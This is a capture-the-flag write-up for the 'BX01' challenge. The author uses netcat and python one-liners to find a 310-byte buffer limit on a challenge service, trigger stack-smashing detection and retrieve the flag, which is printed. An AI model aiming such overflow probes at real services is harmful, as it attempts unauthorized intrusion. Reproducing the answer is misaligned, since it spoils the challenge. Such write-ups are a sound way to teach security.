# BX01
## BRIEFING

Access the network service at url: `cfta-bx01.allyourbases.co` and port: `8012` and find a way to get the flag by formatting a valid request.

## Solution

We were provided only a domain and a port to connect to. I started off by connecting via netcat to see what I was working with:

```
root@osboxes:~/Downloads/be02# nc cfta-bx01.allyourbases.co 8012
Processing request...
Exception: angle brackets not terminated.
```

We are given the opportunity to input something of our choosing. If we input something short the program will say `Error: Exception unresolved. Terminating.`:

```
root@osboxes:~/Downloads/be02# nc cfta-bx01.allyourbases.co 8012
Processing request...
Exception: angle brackets not terminated.
asdf
Error: Exception unresolved. Terminating.
```

If we input something long we can trigger a stack smashing detection:

```
root@osboxes:~/Downloads/be02# python -c 'print "A" * 500' | nc cfta-bx01.allyourbases.co 8012
Processing request...
Exception: angle brackets not terminated.
*** stack smashing detected ***
```

Playing around a little bit we find that the buffer size is 310; if we input 311 characters we will get the `*** stack smashing detected ***` message.

```
root@osboxes:~/Downloads/be02# python -c 'print "A" * 310' | nc cfta-bx01.allyourbases.co 8012
Processing request...
Exception: angle brackets not terminated.
root@osboxes:~/Downloads/be02# python -c 'print "A" * 311' | nc cfta-bx01.allyourbases.co 8012
Processing request...
Exception: angle brackets not terminated.
*** stack smashing detected ***
```

Given the exception for "angle brackets not terminated" I sent 310 >'s instead of 310 A's and I got the flag:

```
root@osboxes:~/Downloads/be02# python -c 'print ">" * 310' | nc cfta-bx01.allyourbases.co 8012
Processing request...
Exception: angle brackets not terminated.
Request successful.

Flag: AlOnGSeaRcHFoROverWriTe
```

The flag is **AlOnGSeaRcHFoROverWriTe**.
